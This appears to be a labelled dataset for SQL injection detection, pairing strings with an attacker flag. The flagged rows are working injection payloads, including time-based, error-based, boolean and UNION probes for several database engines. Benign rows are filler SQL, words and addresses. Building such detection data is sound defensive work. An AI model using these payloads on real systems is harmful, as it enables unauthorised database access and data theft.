Payload	Attacker
1   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   9452  =  9452	1
SELECT * FROM age ORDER BY thumb	0
idt	0
1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197	1
paucides	0
"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--"	1
1  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  3039  =  3039	1
1'  )   where 5680  =  5680 and   (  3020  =  3020  )  *6703--	1
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""onsd"" like ""onsd"	1
"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw"	1
1'+  (  select qugu where 2287  =  2287 order by 1#	1
SELECT * FROM beginning WHERE many = 'wheat'  AND City = 'goose'	0
SELECT face ( s )  FROM hurried	0
1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  	1
  SELECT trap,problem FROM high WHERE tie = 'danger' UNION SELECT attempt, inside FROM hunter	0
SELECT * FROM advice WHERE question BETWEEN '1996-07-01' AND '1996-07-31'	0
-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --	1
santo	0
SELECT * FROM bend WHERE wait = 'anything'  OR cage = 'list'	0
1 or sleep  (  5  )  -- nrzf	1
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 189 )  ORDER BY meta_id ASC	0
4560	0
SELECT camera ( s )  FROM principle	0
"1%"" and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"	1
c/ aira de villaescusa 199, 1f	0
SELECT * FROM individual  WHERE avoid = tax	0
haenning@maxitienda.be	0
c/ maria zayas de sotomayor 18	0
"SELECT DATE_ADD ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;"	0
1'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
SELECT * FROM get WHERE Price NOT BETWEEN 10 AND 20	0
SELECT AVG ( folks ) FROM able	0
1'  )   and 2006  =  2006	1
1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa	1
rad0oelctrico	0
78581094f	0
9.57318E+015	0
   SELECT even,winter,various,team,two     (  (  needle JOIN wet ON example.carry =  would.worker )   INNER JOIN nearbyON Orders.feel =  clay.magicID ) 	0
1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#	1
15365381r	0
end and   (  'hmtt' like 'hmtt	1
1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz	1
1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  '	1
SELECT AVG ( itself ) FROM choose SELECT SUM ( this ) 	0
SELECT TOP 3 * FROM select WHERE business = 'poetry' SELECT * FROM improve	0
49180	0
0a3ramplar	0
1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341	1
indiligencia	0
SELECT * FROM  ( SELECT far FROM gulf ) 	0
"admin""  )   or ""1""  =  ""1""--"	1
SELECT * FROM cotton	0
c/ fuente 28,	0
FROM  ( SELECT DISTINCT return FROM call ) 	0
"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr"	1
hi' or 'a'  =  'a	1
   SELECT suppose, direction, nor FROM game WHERE president  IS NULL	0
cetraro	0
-3096' or 3821  =  5539 and 'zrth'  =  'zrth	1
"1""   )    )    as esho where 8864  =  8864 order by 1--"	1
1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa	1
462514000000000	0
INSERT INTO life  ( base, complex, wore )  VALUES  ( 'silk', 'success', 'diameter' )  	0
"1""  )   as qnmd where 5642  =  5642"	1
SELECT success FROM gate UNION SELECT selection FROM planned ORDER BY outside	0
"1"" where 9889  =  9889"	1
1  )   where 5073  =  5073 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
gierasch.casini@goovitae.cu	0
4.46658E+015	0
SELECT * FROM turn FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM stood	0
INSERT INTO baseball ( wrote, shall, your, half, rabbit, party )  VALUES  ( 'meal', 'ranch'. dead', 'engineer', 'steep', 'unusual', 'service' )  	0
  SELECT ship,thread FROM different WHERE himself = 'remove' UNION SELECT was, circus FROM alike	0
-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--	1
SELECT * FROM repeat WHERE    NOT hang = 'remove'	0
SELECT AVG ( equally ) FROM night	0
1'||  (  select 'ypil' from dual where 4568  =  4568 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'	1
SELECT Count ( * )  AS drive	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3792 )  ORDER BY meta_id ASC	0
faro@vilano.pf	0
"1"" where 5796  =  5796 and sleep  (  5  )  #"	1
SELECT AVG ( strong ) FROM loose SELECT SUM ( shade ) 	0
llub	0
 SELECT * FROM hollow ORDER BY room, does	0
SELECT TOP 50 PERCENT * FROM surprise SELECT * FROM bare FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM deal	0
SELECT cover ( s )  FROM pay FULL OUTER JOIN	0
SELECT * FROM chest 3 SELECT * FROM definition	0
roquelina	0
exigidad	0
SELECT wp_posts.ID FROM wp_posts LEFT JOIN wp_term_relationships ON  ( wp_posts.ID  =  wp_term_relationships.object_id )  WHERE 1 = 1 AND  (  wp_term_relationships.term_taxonomy_id IN  ( 2636 )   )  AND wp_posts.post_type  =  'support_family' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC LIMIT 0, 10	0
pardos@barcafedaniss.co	0
9600	0
SELECT TOP 3 * FROM ring WHERE evening = 'south' SELECT * FROM brick	0
c/ sant antoni maria claret, 173	0
1'||  (  select 'ylek' where 3803  =  3803 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'	1
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) 	1
1750	0
1 where 6827  =  6827	1
SELECT * FROM over 3 SELECT * FROM product	0
DELETE FROM closely WHERE below = 'higher'	0
willingham@necesitocurro.mq	0
SELECT lion ( s )  FROM list UNION	0
ling-yu	0
7288680000000000	0
SELECT * FROM slave FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM useful	0
SELECT COUNT ( DISTINCT him )  FROM thou	0
1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
SELECT * FROM people  WHERE gray NOT LIKE '[obtain]%'	0
1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey	1
-5780 or make_set  (  3464  =  4518,4518  )  -- icit	1
campanini-adamson@barebackspain.kh	0
"-1051""  )   where 6586  =  6586 or 6647  =  6738#"	1
1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'drvk' like 'drvk	1
1'  )   where 9175  =  9175	1
"1%"" and elt  (  5345  =  8751,8751  )   and ""%""  =  """	1
e50land5cer	0
SELECT * FROM parent	0
maren-bufford4@fruteriacartaya.yu	0
 SELECT column_name ( s )  FROM no,former	0
"1%"" union all select null,null,null,null,null,null,null,null,null--"	1
 select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1	1
INSERT INTO watch  ( help, gas, excellent )  VALUES  ( 'among', 'than', 'skill' )  	0
"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""dtwv"" like ""dtwv"	1
INSERT INTO careful  ( dropped, extra, thirty )  VALUES  ( 'length', 'were', 'been' )  	0
brincones	0
"1""  )   where 9093  =  9093"	1
-9634'   )    )     )   union all select 4141,4141#	1
1'   )    )    union all select null,null,null,null,null,null,null,null,null--	1
   SELECT mind,numeral,than,exclaimed,known     (  (  guide JOIN coast ON snake.well =  magic.snake )   INNER JOIN entireON Orders.observe =  underline.viewID ) 	0
229669a3a	0
1',iif  (  7475  =  7475,1,1/0  )  	1
-1630' union all select 1971,1971--	1
"1"" where 2235  =  2235 union all select null,null,null,null,null--"	1
1 union all select null,null,null,null,null,null,null,null,null,null#	1
"1""  )   where 9447  =  9447"	1
85766213h	0
1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   	1
SELECT someone ( s FROM brief RIGHT JOIN	0
h2lmi0to	0
   SELECT COUNT ( open ) , battle FROM several BY direct	0
-3862'  )   or 9323  =  9323#	1
1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'bvdw'  =  'bvdw	1
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn	1
SELECT * FROM mud FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM second	0
SELECT * FROM upward WHERE each NOT LIKE 'moving%'	0
SELECT Count ( * )  AS column	0
1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'	1
1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #	1
SELECT * FROM together WHERE birthday IN  ( SELECT location FROM entire ) 	0
  SELECT equally,other FROM porch WHERE make = 'threw' UNION SELECT exclaimed, engine FROM gray	0
1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'ndhn' like 'ndhn	1
1  )   where 4810  =  4810 union all select null,null#	1
3141140000000000	0
SELECT * FROM probably  WHERE thou NOT LIKE '[account]%'	0
1   )    )    as goar where 2405  =  2405 and 5927  =  9731--	1
INSERT INTO roll ( silence, care, favorite, select, pink, save )  VALUES  ( 'smallest', 'driven'. coming', 'tune', 'hope', 'tell', 'part' )  	0
"1%""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"	1
alabiada	0
 select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1	1
 or uid like '%	1
SELECT * FROM strange WHERE NOT atom = 'has'  AND NOT tide = 'twenty'	0
"admin""  )   or ""1""  =  ""1"	1
SELECT * FROM add WHERE wealth BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT AVG ( Price ) FROM hide	0
SELECT COUNT ( joined ) FROM won	0
aliaguilla	0
donadio_honig@donkr.zr	0
22373	0
SELECT TOP 3 * FROM hung WHERE pan = 'practical' SELECT * FROM fed	0
1'   )    ) 	1
-9136'  )   or make_set  (  9354  =  9354,7185  )  	1
SELECT * FROM flight WHERE aid = 'nervous'  AND City = 'solution'	0
cutillas	0
1'||  (  select 'svgd' from dual where 5188  =  5188 union all select null,null,null,null,null#	1
SELECT DISTINCT positive FROM fallen	0
"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn"	1
SELECT AVG ( furniture ) FROM luck SELECT SUM ( anyone ) 	0
SELECT * FROM count WHERE right = 'tune'  AND City = 'how'	0
1%' or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'vgro' like 'vgro	1
1   )    )    and 7533  =  7533 and    (    (   8738  =  8738	1
1' where 4358  =  4358 union all select null,null,null,null--	1
SELECT * FROM general WHERE four = 'explanation'	0
SELECT triangle	0
SELECT * FROM nearby  WHERE went = she	0
 (  case when 8422  =  8452 then 1 else null end  ) 	1
mebine	0
INSERT INTO actually  ( sides, year, recognize )  VALUES  ( 'gravity', 'use', 'thumb' )  	0
SELECT road ( s )  FROM middle SELECT rice FROM broke	0
SELECT TOP 3 * FROM between	0
9i3a	0
7912640000000000	0
   SELECT COUNT ( trip ) , apart FROM fish BY rain	0
  SELECT fellow,fact FROM manufacturing WHERE handsome = 'better' UNION SELECT fireplace, result FROM lamp	0
"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""ctrr""  =  ""ctrr"	1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""khuw"" like ""khuw"	1
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_timeout_wp_wps_bg_image_sync_1_process_lock' LIMIT 1	0
DELETE FROM mile	0
gelis	0
"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--"	1
1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  5220  =  5220	1
DELETE FROM fully WHERE memory = 'wonderful'	0
10110	0
1%'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   '%'  =  '	1
haddon@hiperbarcelona.tl	0
1  )   where 1402  =  1402	1
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""xbft""  =  ""xbft"	1
33600	0
mendie	0
SELECT * FROM society WHERE adult NOT LIKE 'voyage%'	0
"1"" where 9973  =  9973 and 2006  =  2006"	1
SELECT DISTINCT compass FROM bell	0
"1%""   )    )     )   union all select null,null,null,null,null,null,null#"	1
staton	0
DELETE FROM tight	0
SELECT * FROM mostly	0
"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fktl""  =  ""fktl"	1
1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '	1
-5250  )   where 1591  =  1591 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --	1
"1"" where 8635  =  8635 and 4595  =  4595#"	1
"1%""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
SELECT * FROM truth 3	0
   SELECT include, voice, ate FROM please WHERE can  IS NULL	0
SELECT young ( s ) FROM behavior INNER JOIN	0
  SELECT * FROM extra WHERE same NOT IN  ( 'recall', 'practical', 'best' )  	0
select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '	1
1'  )   where 7537  =  7537 and 2006  =  2006	1
ignacio aldecoa, 30, 6h	0
roger	0
1 and make_set  (  6911  =  1867,1867  )  	1
   SELECT sand, ball+ ', ' + volume+ ' ' + feathers+ ', ' + cutting AS ordinary  FROM tall	0
SELECT cry	0
SELECT * FROM rod WHERE Price NOT BETWEEN 10 AND 20	0
SELECT * FROM reader WHERE busy = 'expect' FETCH FIRST 3 ROWS ONLY	0
1' union all select null,null,null,null,null,null,null,null#	1
SELECT AVG ( sat ) FROM character SELECT SUM ( practical ) 	0
SELECT AVG ( food ) FROM sit SELECT SUM ( wave ) 	0
orion	0
SELECT * FROM statement WHERE worker  BETWEEN 10 AND 20	0
SELECT * FROM instead WHERE solar LIKE '%create%'	0
47209	0
SELECT * FROM log WHERE primitive  BETWEEN 10 AND 20	0
